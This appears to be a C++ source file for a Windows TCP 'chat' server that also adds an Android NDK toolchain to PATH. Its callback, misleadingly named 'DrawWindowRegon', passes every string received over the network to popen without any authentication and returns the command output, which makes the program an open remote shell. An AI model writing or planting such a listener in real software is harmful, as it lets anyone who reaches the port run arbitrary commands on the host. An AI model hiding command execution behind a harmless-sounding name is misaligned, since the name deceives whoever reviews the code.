#include <iostream>
#include <string>
#include <winsock.h>
#include <map>
#include "TcpChatX.h"

#define ENV_NAME_PATH "PATH"
#define NDK_TOOL_HOME "D:\\Android\\ndk\\android-ndk-r19c\\toolchains\\"
#define AARCH64_HOME NDK_TOOL_HOME "aarch64-linux-android-4.9\\"
#define AARCH64_PATH AARCH64_HOME "prebuilt\\windows-x86_64\\bin"

int _System(const char *cmd, char *pRetMsg, int msgLen)
{
	if (cmd == NULL || pRetMsg == NULL || msgLen < 0) {
		return -1;
	}
	FILE *fp = popen(cmd, "r");
	if (fp == NULL) {
		strncpy(pRetMsg, "Popen Error!\n", msgLen);
		return -2;
	} else {
		memset(pRetMsg, 0, msgLen);
		//get lastest result
		fread(pRetMsg, 1, msgLen, fp);
		pRetMsg[msgLen - 1] = '\0';
		pclose(fp);
		return 0;
	}
}

int DrawWindowRegon(TcpPackage *tp)
{
	std::cout << "msg <= :" << tp->buf << std::endl;
	_System(tp->buf, tp->buf, sizeof(tp->buf));
	tp->size = strlen(tp->buf);
	std::cout << tp->size << " res => :" << tp->buf << std::endl;
	return 0;
}

int SetEnvCfg()
{
	std::string pathVal = ENV_NAME_PATH;
	pathVal += "=";
	pathVal += getenv(ENV_NAME_PATH);
	pathVal += ";";
	pathVal += AARCH64_PATH;
	putenv(pathVal.c_str());
	return 0;
}
int main()
{
	SetEnvCfg();
	DWORD threadId;
	TcpChat *tc = TcpChat::GetInstance();
	tc->Init(DrawWindowRegon);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)tc->Accept, tc, 0, &threadId);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)tc->RecvTextCtx, tc, 0, &threadId);
	getchar();
	return 0;
}